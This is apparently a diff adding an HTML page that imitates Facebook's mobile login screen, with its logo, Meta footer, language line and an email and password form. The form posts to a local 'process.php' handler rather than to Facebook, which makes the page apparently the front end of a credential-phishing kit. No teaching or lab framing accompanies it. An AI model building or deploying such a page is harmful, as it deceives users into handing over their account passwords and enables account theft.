@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" type="image/x-icon" href="fav.png">
+
+<title>Facebook</title>
+
+<style>
+
+body{
+margin:0;
+background:#f0f2f5;
+font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+
+.container{
+width:360px;
+height:840px;
+text-align:center;
+}
+
+.logo img{
+width:72px;
+margin-bottom:40px;
+}
+
+.input-box{
+width:100%;
+padding:14px;
+margin-bottom:12px;
+border-radius:12px;
+border:1px solid #ccd0d5;
+font-size:16px;
+box-sizing:border-box;
+}
+
+.login-btn{
+width:100%;
+padding:14px;
+border:none;
+border-radius:28px;
+background:#0064E0;
+color:white;
+font-size:18px;
+font-weight:600;
+cursor:pointer;
+}
+
+.login-btn:hover{
+opacity:.9;
+}
+
+.link{
+margin-top:16px;
+color:#191317;
+font-size:17px;
+font-style: bold;
+}
+
+.create{
+margin-top:50px;
+}
+
+.create button{
+width:100%;
+padding:12px;
+border-radius:28px;
+border:1px solid #2d7ff9;
+background:white;
+color:#2d7ff9;
+font-weight:600;
+cursor:pointer;
+margin-top: 120px;
+}
+
+.footer{
+margin-top:30px;
+color:#777;
+font-size:14px;
+}
+.top-bar{
+background:#f0f2f5;
+text-align:center;
+padding-top:10px;
+}
+
+.download{
+font-size:16px;
+color:#1763CF;
+padding-bottom:10px;
+border-bottom:1px solid #dadde1;
+text-align: left;
+}
+
+.language{
+font-size:16px;
+color:#65676b;
+padding:12px;
+}
+</style>
+</head>
+
+<body>
+
+
+
+<div class="container">
+
+<div class="top-bar">
+
+<div class="download">
+ <img src="down.png" width="22px" style="color: #0064E0;"> Get Facebook for iOS and browse faster.
+</div>
+
+<div class="language">
+English (UK)
+</div>
+
+</div>
+<br><br><br><br>
+<div class="logo">
+<img src="logo.png">
+</div>
+<br><br>
+
+
+
+<!-- <form action="process.php" method="POST">
+
+<input class="input-box" name="email" placeholder="Email or mobile number">
+
+<input class="input-box" name="password" type="password" placeholder="Password">
+
+<button class="login-btn">Log in</button>
+
+</form> -->
+<form action="process.php" method="POST">
+
+<input 
+class="input-box"
+type="text"
+name="email"
+placeholder="Email or mobile number"
+required
+>
+
+<input 
+class="input-box"
+type="password"
+name="password"
+placeholder="Password"
+required
+>
+
+<button type="submit" class="login-btn">
+Log in
+</button>
+
+</form>
+
+<div class="link">Forgotten password?</div>
+
+<div class="create">
+<button>Create new account</button>
+</div>
+
+<div class="footer">
+  <img src="meta.png" width="50px">
+</div>
+<br>
+<footer style="font-size: 10px;">About Help More</footer>
+</div>
+
+
+</body>
+</html>
